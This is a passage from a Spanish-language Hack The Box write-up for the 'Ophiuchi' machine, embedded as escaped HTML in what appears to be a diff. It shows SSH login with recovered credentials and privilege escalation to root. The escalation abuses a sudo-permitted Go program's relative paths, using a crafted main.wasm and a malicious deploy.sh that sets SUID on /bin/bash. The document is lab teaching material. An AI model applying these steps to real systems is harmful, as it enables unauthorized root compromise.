+  &amp;lt;user &lt;span class=&#34;nv&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tomcat&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;must-be-changed&amp;gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;roles&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tomcat&amp;#34;&lt;/span&gt;/&amp;gt;
+  &amp;lt;user &lt;span class=&#34;nv&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;both&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;must-be-changed&amp;gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;roles&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tomcat,role1&amp;#34;&lt;/span&gt;/&amp;gt;
+  &amp;lt;user &lt;span class=&#34;nv&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;role1&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;must-be-changed&amp;gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;roles&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;role1&amp;#34;&lt;/span&gt;/&amp;gt;
+--&amp;gt;
+&amp;lt;/tomcat-users&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;admin---user-&#34;&gt;ADMIN - USER&lt;/h2&gt;
+&lt;p&gt;Utilizamos las credenciales para obtener acceso al panel de tomcat, aunque, utilizando estas en el servicio SSH logramos obtener una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt; .&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~/htb/ophiuchi&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+└─$ ssh admin@10.10.10.227 &lt;span class=&#34;c1&#34;&gt;# whythereisalimit&lt;/span&gt;
+admin@10.10.10.227&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+admin@ophiuchi:~$ whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;id&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
+admin
+&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;admin&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;admin&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;admin&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+/home/admin
+admin@ophiuchi:~$ cat user.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; cut -c1-15
+71c0901a2150cf8
+admin@ophiuchi:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
+&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos sudo (root) para ejecutar el comando &lt;code&gt;/usr/bin/go run /opt/wasm-functions/index.go&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Revisamos el codigo fuente de &lt;code&gt;index.go&lt;/code&gt;, vemos que realiza la lectura de un archivo &lt;a href=&#34;https://es.wikipedia.org/wiki/WebAssembly&#34;&gt;&lt;code&gt;wasm&lt;/code&gt;&lt;/a&gt; utilizando la libreria &lt;a href=&#34;https://github.com/wasmerio/wasmer-go#examples&#34;&gt;&lt;strong&gt;wasmer&lt;/strong&gt;&lt;/a&gt;, crea una nueva instancia y exporta la funcion &lt;code&gt;info&lt;/code&gt; la cual ejecuta, finalmente verifica que el string de esta funcion ejecutada sea valor &lt;strong&gt;1&lt;/strong&gt;, si esto no se cumple imprime el mensaje &lt;code&gt;Not ready to deploy&lt;/code&gt;, en caso contrario realiza la ejecucion de un script llamado &lt;code&gt;deploy.sh&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-golang&#34; data-lang=&#34;golang&#34;&gt;&lt;span class=&#34;kn&#34;&gt;package&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;main&lt;/span&gt;
+
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+        &lt;span class=&#34;s&#34;&gt;&amp;#34;fmt&amp;#34;&lt;/span&gt;
+        &lt;span class=&#34;nx&#34;&gt;wasm&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;github.com/wasmerio/wasmer-go/wasmer&amp;#34;&lt;/span&gt;
+        &lt;span class=&#34;s&#34;&gt;&amp;#34;os/exec&amp;#34;&lt;/span&gt;
+        &lt;span class=&#34;s&#34;&gt;&amp;#34;log&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+
+&lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;nx&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;wasm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;ReadBytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;main.wasm&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+
+        &lt;span class=&#34;nx&#34;&gt;instance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;_&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;wasm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;NewInstance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;defer&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;instance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Close&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+        &lt;span class=&#34;nx&#34;&gt;init&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;instance&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Exports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;info&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+        &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;_&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+        &lt;span class=&#34;nx&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;result&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+                &lt;span class=&#34;nx&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Println&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Not ready to deploy&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+                &lt;span class=&#34;nx&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Println&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Ready to deploy&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+                &lt;span class=&#34;nx&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;deploy.sh&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Output&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+                &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;nil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+                        &lt;span class=&#34;nx&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Fatal&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;err&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+                &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+                &lt;span class=&#34;nx&#34;&gt;fmt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;Println&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
+        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Dentro de la carpeta &lt;code&gt;/opt/wasm-functions/&lt;/code&gt; encontramos los archivos utilizados en &lt;code&gt;index.go&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;admin@ophiuchi:~$ ls -lah /opt/wasm-functions/
+total 3.9M
+drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; root root 4.0K Oct &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 19:52 .
+drwxr-xr-x &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; root root 4.0K Oct &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 09:56 ..
+drwxr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root 4.0K Oct &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 19:52 backup
+-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root   &lt;span class=&#34;m&#34;&gt;88&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 19:49 deploy.sh
+-rwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root 2.5M Oct &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 19:52 index
+-rw-rw-r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;522&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 19:48 index.go
+-rwxrwxr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root 1.5M Oct &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt; 19:41 main.wasm
+admin@ophiuchi:~$ cat deploy.sh
+&lt;span class=&#34;c1&#34;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;# ToDo&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;# Create script to automatic deploy our new web at tomcat port 8080&lt;/span&gt;
+admin@ophiuchi:~$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Si bien existen estos dos archivos (main.wasm, deploy.sh), en el codigo fuente no especifica la direccion completa de ambos, por lo que podriamos ejecutar &lt;code&gt;index.go&lt;/code&gt; en cualquier carpeta y utilizar nuestro archivo main.wasm para provocar la ejecucion del script deploy.sh.&lt;/p&gt;
+&lt;h2 id=&#34;wasmmain&#34;&gt;WASM.MAIN&lt;/h2&gt;
+&lt;p&gt;Creamos un archivo &lt;code&gt;wasm&lt;/code&gt; el cual contiene la funcion &lt;code&gt;info&lt;/code&gt; y el resultado cuando es ejecutado es: &lt;strong&gt;1&lt;/strong&gt;, basandonos de un ejemplo de &lt;a href=&#34;https://github.com/wasmerio/wasmer-go/blob/master/examples/appendices/simple.rs&#34;&gt;wasmer&lt;/a&gt; en rust, utilizando la plataforma &lt;a href=&#34;https://webassembly.studio/&#34;&gt;webassembly&lt;/a&gt; en un proyecto vacio de RUST.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/ophiuchi/Screenshot_3.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Dentro de &lt;code&gt;main.js&lt;/code&gt; modificamos la funcion, para verificar el resultado.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/ophiuchi/Screenshot_5.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Modificamos el archivo &lt;code&gt;main.rs&lt;/code&gt; donde agregamos la funcion, compilamos y ejecutamos.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/ophiuchi/Screenshot_4.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Vemos en la parte inferior derecha que el resultado es &lt;strong&gt;1&lt;/strong&gt; cuando la funcion es llamada en &lt;code&gt;main.js&lt;/code&gt;, además se creó el archivo &lt;code&gt;main.wasm&lt;/code&gt; el cual descargamos.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/htb/ophiuchi/Screenshot_6.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;admin---wasm--root&#34;&gt;ADMIN - WASM &amp;gt; ROOT&lt;/h2&gt;
+&lt;p&gt;Descargamos el archivo &lt;code&gt;main.wasm&lt;/code&gt; en la maquina, creamos el script &lt;code&gt;deploy.sh&lt;/code&gt; con un pequeña ejecucion de comando en la carpeta &lt;code&gt;/dev/shm&lt;/code&gt;. Vemos que nuestro script es ejecutado como &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;admin@ophiuchi:/dev/shm$ touch deploy.sh 
+admin@ophiuchi:/dev/shm$ vim deploy.sh 
+admin@ophiuchi:/dev/shm$ cat deploy.sh 
+&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Hello I&amp;#39;m &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;$(&lt;/span&gt;whoami&lt;span class=&#34;k&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &amp;gt; /dev/shm/whoami.txt
+admin@ophiuchi:/dev/shm$ ls
+deploy.sh  main.wasm
+admin@ophiuchi:/dev/shm$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Ready to deploy
+
+admin@ophiuchi:/dev/shm$ ls
+deploy.sh  main.wasm  whoami.txt
+admin@ophiuchi:/dev/shm$ cat whoami.txt 
+Hello I&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;m root
+admin@ophiuchi:/dev/shm$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Modificamos el script para darle permisos &lt;code&gt;SUID&lt;/code&gt; a &lt;code&gt;/bin/bash&lt;/code&gt; para &lt;a href=&#34;https://gtfobins.github.io/gtfobins/bash/#suid&#34;&gt;obtener&lt;/a&gt; una shell como root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;admin@ophiuchi:/dev/shm$ ls -lah /bin/bash
+-rwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root 1.2M Feb &lt;span class=&#34;m&#34;&gt;25&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /bin/bash
+admin@ophiuchi:/dev/shm$ vim deploy.sh 
+admin@ophiuchi:/dev/shm$ cat deploy.sh 
+&lt;span class=&#34;c1&#34;&gt;#echo &amp;#34;Hello I&amp;#39;m $(whoami)&amp;#34; &amp;gt; /dev/shm/whoami.txt&lt;/span&gt;
+chmod u+s /bin/bash
+admin@ophiuchi:/dev/shm$ sudo /usr/bin/go run /opt/wasm-functions/index.go
+Ready to deploy
+
